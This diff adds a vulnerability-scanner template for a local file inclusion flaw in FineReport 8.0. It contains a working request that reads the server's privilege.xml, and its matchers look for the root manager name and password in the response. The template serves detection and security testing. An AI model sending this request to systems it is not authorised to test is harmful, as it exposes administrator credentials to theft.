@@ -1,0 +1,29 @@
+id: "finereport-path-traversal"
+name: "FineReport 8.0 - Local File Inclusion"
+severity: "high"
+description: "FIneReport 8.0 is vulnerable to local file inclusion."
+tech:
+  - "generic"
+tags:
+  - "finereport"
+  - "lfi"
+  - "vuln"
+reference: "https://web.archive.org/web/20200506020241/http://foreversong.cn/archives/1378"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<rootManagerName>"
+      - "<rootManagerPassword>"
+    condition: "and"
+  - type: "status"
+    status:
+      - 200
